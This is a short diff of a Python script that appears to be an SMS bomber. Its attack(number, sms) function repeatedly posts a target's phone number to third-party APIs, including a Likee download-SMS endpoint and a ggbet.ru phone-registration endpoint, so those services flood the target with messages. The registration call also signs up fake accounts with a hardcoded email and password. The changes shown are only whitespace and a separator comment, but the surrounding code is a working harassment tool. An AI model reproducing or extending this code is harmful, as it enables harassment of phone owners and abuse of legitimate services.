@@ -230,7 +230,7 @@ def attack(number, sms):
             check(sent, sms)
         except:
             pass
-        
+
         try:
             requests.post('https://api.like-video.com/likee-activity-flow-micro/commonApi/sendDownloadSms', json={"telephone": number_7, "lang": "ru"}, headers=HEADERS)
             sent += 1
@@ -238,8 +238,9 @@ def attack(number, sms):
             check(sent, sms)
         except:
             pass
-        
-         try:
+#====================================================================
+
+        try:
             requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": number_plus7, "login": "ivan@gmail.com", "password": "Qwasz123", "agreement": "true", "oferta": "true", "oferta": "true"}, headers=HEADERS)
             sent += 1
             time(sent)
@@ -262,4 +263,3 @@ def attack(number, sms):
             check(sent, sms)
         except:
             pass
-
